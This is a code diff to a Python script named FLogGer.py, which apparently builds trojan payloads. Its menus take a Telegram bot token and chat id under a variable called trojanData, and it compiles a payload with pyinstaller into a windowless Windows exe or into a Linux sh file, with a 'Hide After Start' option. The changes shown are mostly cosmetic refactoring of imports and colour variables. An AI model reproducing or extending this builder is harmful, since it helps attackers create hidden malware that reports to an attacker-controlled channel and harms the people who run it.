@@ -1,7 +1,7 @@
-import os
+from os import system
 from colorama import Fore
-import time
-import platform
+from time import sleep
+from platform import uname
 from rich.console import Console
 from rich.table import Table
 
@@ -18,24 +18,15 @@ for i in filePath :
 filePath = arry.split('/FLogGer.py')
 
 # Variable
-targetInfo = platform.uname()
+targetInfo = uname()
 filePath = filePath[0]+'/'
 login = '0'
 trojanData = {'token': None, 'chatId': None}
 payloadName = 'file'
 Red = Fore.RED
-Blue = Fore.BLUE
 White = Fore.WHITE
 Green = Fore.GREEN
 Yellow = Fore.YELLOW
-Cyan = Fore.CYAN
-
-R = Fore.RED
-B = Fore.BLUE
-W = Fore.WHITE
-G = Fore.GREEN
-Y= Fore.YELLOW
-C = Fore.CYAN
 
 inputICon = (Green+'=-=>  '+White)
 
@@ -49,36 +40,36 @@ iconName = Green+'''
 '''
 
 helpMessage = f'''
-    {Y}╔════════════════════════════════════════════════════════════════════════════════════╗
-    {Y}║{G}  -bt     Telgram Bot TOKEN < -bt 1313131313:qwwwet45gdfg3dfhdsdkwsm9mfks9edjdls >  {Y}║
-    {Y}║{G}  -ci     Telgram Chat Id < -ci 121212121 >                                         {Y}║
-    {Y}║{G}  -np     Set Payload Name, Don't Enter The File Extension(Default Name : file)     {Y}║
-    {Y}║{G}  -o      Show option                                                               {Y}║
-    {Y}║{G}  -s      Start Compile                                                             {Y}║
-    {Y}║{G}  -h      Help                                                                      {Y}║
-    {Y}║{G}  -e      Exit                                                                      {Y}║
-    {Y}╚════════════════════════════════════════════════════════════════════════════════════╝
+    {Yellow}╔════════════════════════════════════════════════════════════════════════════════════╗
+    {Yellow}║{Green}  -bt     Telgram Bot TOKEN < -bt 1313131313:qwwwet45gdfg3dfhdsdkwsm9mfks9edjdls >  {Yellow}║
+    {Yellow}║{Green}  -ci     Telgram Chat Id < -ci 121212121 >                                         {Yellow}║
+    {Yellow}║{Green}  -np     Set Payload Name, Don't Enter The File Extension(Default Name : file)     {Yellow}║
+    {Yellow}║{Green}  -o      Show option                                                               {Yellow}║
+    {Yellow}║{Green}  -s      Start Compile                                                             {Yellow}║
+    {Yellow}║{Green}  -h      Help                                                                      {Yellow}║
+    {Yellow}║{Green}  -e      Exit                                                                      {Yellow}║
+    {Yellow}╚════════════════════════════════════════════════════════════════════════════════════╝
 '''+White
 
 compilerMessage = Green+'''
-    {Y}╔════════════════════════════════════════════════════════════════════════════════════╗
-    {Y}║{B}  ?       Help                                                                      {Y}║
-    {Y}║{B}  1       exe File (windows)                                                        {Y}║
-    {Y}║{B}  2       sh File (linux)                                                           {Y}║
-    {Y}║{B}  B       Back                                                                      {Y}║
-    {Y}║{B}  E       Exit                                                                      {Y}║
-    {Y}╚════════════════════════════════════════════════════════════════════════════════════╝
+    {Yellow}╔════════════════════════════════════════════════════════════════════════════════════╗
+    {Yellow}║{Green}  ?       Help                                                                      {Yellow}║
+    {Yellow}║{Green}  1       exe File (windows)                                                        {Yellow}║
+    {Yellow}║{Green}  2       sh File (linux)                                                           {Yellow}║
+    {Yellow}║{Green}  B       Back                                                                      {Yellow}║
+    {Yellow}║{Green}  E       Exit                                                                      {Yellow}║
+    {Yellow}╚════════════════════════════════════════════════════════════════════════════════════╝
 '''+White
 
 # Def
     
 def ToExe():
-    os.system('pip install pyinstaller')
+    system('pip install pyinstaller')
     print(Green+'pyinstaller install'+White)
-    os.system(f'cd {filePath}/ && mkdir payload && cd payload && mkdir tmp && dir')
+    system(f'cd {filePath}/ && mkdir payload && cd payload && mkdir tmp && dir')
     print(Green+f'your File Path: {filePath}'+White)
-    time.sleep(1)
-    os.system(f'pyinstaller --onefile -c --distpath {filePath}/payload --workpath {filePath}/payload/tmp {payloadName}.py -w ')
+    sleep(1)
+    system(f'pyinstaller --onefile -c --distpath {filePath}/payload --workpath {filePath}/payload/tmp {payloadName}.py -w ')
     open(f'{payloadName}.py', 'w')
     print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour payload is in '+Green+f'{filePath}payload/{payloadName}.exe'+' directory\n════════════════════════════════════════════════════════════════════════════════════')
 
@@ -93,7 +84,8 @@ def Compiler():
         return
     
     
-    print(Cyan+compilerMessage)
+    print(compilerMessage)
+
     while True:
         workSub = str(input(inputICon))
         if workSub == '':
@@ -102,7 +94,7 @@ def Compiler():
         else:
             workSub = workSub.split()
         
-        os.system('cd payload')
+        system('cd payload')
         
         if workSub[0] == '1':
             x = input('Hide After Start y/n? ( default y ) ')
